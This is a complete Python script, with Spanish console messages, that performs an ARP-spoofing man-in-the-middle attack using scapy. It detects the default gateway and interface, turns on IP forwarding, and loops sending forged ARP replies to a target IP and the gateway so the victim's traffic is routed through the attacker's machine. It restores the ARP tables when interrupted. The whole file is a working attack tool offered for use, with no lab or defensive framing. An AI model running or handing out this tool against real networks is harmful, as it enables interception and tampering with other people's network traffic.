#!/usr/bin/env python3
from scapy.all import *
import sys
import time
import os

def get_gateway_ip():
    with os.popen("ip route show default") as route:
        return route.read().split()[2]

def get_interface():
    with os.popen("ip route show default") as route:
        return route.read().split()[4]

def spoof(target_ip, gateway_ip, interface):
    packet = ARP(op=2, pdst=target_ip, hwdst=getmacbyip(target_ip), psrc=gateway_ip)
    send(packet, verbose=False, iface=interface)

def restore(target_ip, gateway_ip, interface):
    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    send(packet, count=4, verbose=False, iface=interface)

def start_attack(target_ip):
    try:
        gateway_ip = get_gateway_ip()
        interface = get_interface()
        
        print(f"\n[+] Objetivo: {target_ip}")
        print(f"[+] Gateway: {gateway_ip}")
        print(f"[+] Interfaz: {interface}")
        print("[+] Activando IP forwarding...")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        
        print("[+] Iniciando ataque ARP (CTRL+C para detener)...\n")
        sent_packets = 0
        
        while True:
            spoof(target_ip, gateway_ip, interface)
            spoof(gateway_ip, target_ip, interface)
            sent_packets += 2
            print(f"\r[+] Paquetes enviados: {sent_packets}", end="")
            time.sleep(2)
            
    except KeyboardInterrupt:
        print("\n\n[!] Deteniendo ataque...")
        restore(target_ip, gateway_ip, interface)
        restore(gateway_ip, target_ip, interface)
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[+] Tablas ARP restauradas")
        print("[+] Ataque detenido correctamente")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] Error: Debes ejecutar como root (sudo)")
        sys.exit(1)
        
    if len(sys.argv) != 2:
        print(f"Uso: sudo {sys.argv[0]} <IP_objetivo>")
        sys.exit(1)
        
    target_ip = sys.argv[1]
    start_attack(target_ip)